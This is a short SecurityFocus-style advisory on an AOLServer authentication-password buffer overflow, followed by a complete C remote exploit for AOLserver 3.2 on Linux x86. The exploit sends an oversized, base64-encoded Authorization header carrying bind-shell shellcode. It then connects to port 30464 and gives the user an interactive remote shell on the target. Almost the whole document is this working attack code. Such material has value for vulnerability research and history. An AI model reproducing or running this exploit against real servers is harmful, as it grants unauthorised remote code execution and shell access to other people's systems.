source: http://www.securityfocus.com/bid/3230/info
 
AOLServer is a freely available, open source web server. It was originally written by AOL, and is currently developed and maintained by AOL and public domain.
 
A problem has been discovered that can allow remote users to crash an AOLServer, denying service to legitimate users of the system. The problem is due to the handling of passwords. It is possible for a remote user to overflow a buffer within the AOLServer process by sending a password of 2048 bytes. This could result in the overwriting of stack variables, including the return address.
 
This makes it possible for a remote user to execute arbitrary code with the privileges of the AOLServer process, and potentially gain local access.

/*
 * AOLserver version 3.2 and prior Linux x86 remote exploit
 * by qitest1 - Wed Sep 5 17:20:10 CEST 2001 
 *
 * Proof of concept code for exploiting the bof in ParseAuth(). I
 * used this vuln as a playground for some tests, all done on a RH6.2
 * box. The fp will be overwritten by a pointer to a fake frame, with 
 * an fp and an eip pointing to the shellcode. Very unstable, segfault 
 * in most cases. 
 *
 * Greets:	grazer and the other hot guys on #!digit-labs 
 *		teleh0r: come back home fratello! =)
 *
 * ..harder times for 0x69, now at http://digit-labs.org/qitest1..
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define	EIP_POS	260
#define SC_ADDR	0xbf1ff9a8
#define FP	0xbf1ff9a0		
#define FAKE_FP 0xbf1ffaf4

  char shellcode[] = /* Taeho Oh bindshell code at port 30464 */
  "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
  "\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
  "\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
  "\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
  "\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
  "\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
  "\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
  "\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
  "\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
  "\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
  "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
  "\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";

  int		sockami(char *host, int port);
  void  	shellami(int sock);  
  void		zbuffami(u_long fp, u_long sc_addr, char *zbuf);	
  int		Ns_HtuuEncode(unsigned char *bufin, 
			      unsigned int nbytes, 
			      char * bufcoded);

int
main(int argc, char **argv)
{
  int	sock;
  char	zbuf[1024], ubuf[1024], sbuf[1024];

  printf("\n  AOLserver version 3.3 and prior exploit by qitest1\n\n");

  if(argc == 1)
	{
	  fprintf(stderr, "Usage: %s <target>\n", argv[0]);
	  exit(1);
	}

  printf("+Connecting to %s...\n", argv[1]);
  sock = sockami(argv[1], 80);
  printf("  connected\n");

  printf("+Building buffer with shellcode len: %d...\n", 
  strlen(shellcode)); 
  memset(zbuf, 0x00, sizeof(zbuf));
  zbuffami(FP, SC_ADDR, zbuf);  
  printf("  done\n");

  printf("+Encoding buffer...\n");
  memset(ubuf, 0x00, sizeof(ubuf));
  Ns_HtuuEncode(zbuf, strlen(zbuf), ubuf);
  printf("  done\n");

  printf("+Making http request...\n");
  sprintf(sbuf, 
  "GET / HTTP/1.0\nAuthorization: Basic %s\r\n\r\n", ubuf);
  send(sock, sbuf, strlen(sbuf), 0);
  printf("  done\n");

  printf("+Waiting for the shellcode to be executed...\n  0x69\n");
  sleep(2);
  sock = sockami(argv[1], 30464);
  shellami(sock);
}

int
sockami(char *host, int port)
{
  struct sockaddr_in    address;
  struct hostent        *hp;
  int                   sock;

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock == -1)
        {
          perror("socket()");
          exit(-1);
        }
 
  hp = gethostbyname(host);
  if(hp == NULL)
        {
          perror("gethostbyname()");
          exit(-1);
        }

  memset(&address, 0, sizeof(address));
  memcpy((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons(port);

  if(connect(sock, (struct sockaddr *) &address, sizeof(address)) == -1)
        {
          perror("connect()");
          exit(-1);
        }

  return(sock);
}

void
shellami(int sock)
{
  int             n;
  char            recvbuf[1024], *cmd = "id; uname -a\n";
  fd_set          rset;

  send(sock, cmd, strlen(cmd), 0);

  while (1)
    {
      FD_ZERO(&rset);
      FD_SET(sock, &rset);
      FD_SET(STDIN_FILENO, &rset);
      select(sock+1, &rset, NULL, NULL, NULL);
      if(FD_ISSET(sock, &rset))
        {
          n = read(sock, recvbuf, 1024);
          if (n <= 0)
            {
              printf("Connection closed by foreign host.\n");
              exit(0);
            }
          recvbuf[n] = 0;
          printf("%s", recvbuf);
        }
      if (FD_ISSET(STDIN_FILENO, &rset))
        {
          n = read(STDIN_FILENO, recvbuf, 1024);
          if (n > 0)
            {
              recvbuf[n] = 0;
              write(sock, recvbuf, n);
            }
        }
    }
  return;
}

void
zbuffami(u_long fp, u_long sc_addr, char *zbuf)
{
  int   i, n = 0; 

  for(i = 0; i < EIP_POS; i++)
	zbuf[i] = 0x90; 

  /* Fake frame...
   */
  zbuf[0] = (u_char) (FAKE_FP & 0x000000ff);
  zbuf[1] = (u_char)((FAKE_FP & 0x0000ff00) >> 8); 
  zbuf[2] = (u_char)((FAKE_FP & 0x00ff0000) >> 16);
  zbuf[3] = (u_char)((FAKE_FP & 0xff000000) >> 24);

  zbuf[4] = (u_char) (sc_addr & 0x000000ff);
  zbuf[5] = (u_char)((sc_addr & 0x0000ff00) >> 8);
  zbuf[6] = (u_char)((sc_addr & 0x00ff0000) >> 16);
  zbuf[7] = (u_char)((sc_addr & 0xff000000) >> 24);
	
  for(i = EIP_POS - 4 - strlen(shellcode) - 8; i < EIP_POS - 4 - 8; i++)
        zbuf[i] = shellcode[n++];

  /* Padding...
   */	
  for(n = 0; n < 8 ; n++)
        zbuf[i++] = 0x69;
	
  zbuf[EIP_POS - 4] = (u_char) (fp & 0x000000ff);
  zbuf[EIP_POS - 3] = (u_char)((fp & 0x0000ff00) >> 8);
  zbuf[EIP_POS - 2] = (u_char)((fp & 0x00ff0000) >> 16);
  zbuf[EIP_POS - 1] = (u_char)((fp & 0xff000000) >> 24);

  zbuf[EIP_POS] = 0x00;

  /* Extra junk
   */
  for(i = 0; i < 4; i++)
	strcat(zbuf, "\x69\x69\x69\x69");

  return;
}

  static char    six2pr[64] = 
	{
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'
	};

  static unsigned char pr2six[256];

  /* qitest1 and the pleasure of reading... ;pP
   * This routine converts a buffer of bytes to/from RFC 1113
   * printable encoding format.
   * This technique is similar to the familiar Unix uuencode format
   * in that it maps 6 binary bits to one ASCII character (or more
   * aptly, 3 binary bytes to 4 ASCII characters).  However, RFC 1113 
   * does not use the same mapping to printable characters as uuencode. 
   * 
   * Mark Riordan   12 August 1990 and 17 Feb 1991.
   * This code is hereby placed in the public domain. 
   *
   * Encode a single line of binary data to a standard format that
   * uses only printing ASCII characters (but takes up 33% more bytes).
   */
int
Ns_HtuuEncode(unsigned char *bufin, unsigned int nbytes, char * bufcoded)
{

#define ENC(c) six2pr[c]

    register char  *outptr = bufcoded;
    unsigned int    i;

    for (i = 0; i < nbytes; i += 3) {
                /* c1 */
        *(outptr++) = ENC(*bufin >> 2);
                /* c2 */
        *(outptr++) = ENC(((*bufin << 4) & 060) | ((bufin[1] >> 4) & 017));
                /* c3 */
        *(outptr++) = ENC(((bufin[1] << 2) & 074) | ((bufin[2] >> 6) & 03));
                /* c4 */
        *(outptr++) = ENC(bufin[2] & 077);      

        bufin += 3;
    }

    /*
     * If nbytes was not a multiple of 3, then we have encoded too many
     * characters.  Adjust appropriately.
     */
    if (i == nbytes + 1) {
        /* There were only 2 bytes in that last group */
        outptr[-1] = '=';
    } else if (i == nbytes + 2) {
        /* There was only 1 byte in that last group */
        outptr[-1] = '=';
        outptr[-2] = '=';
    }
    *outptr = '\0';
    return (outptr - bufcoded);
}



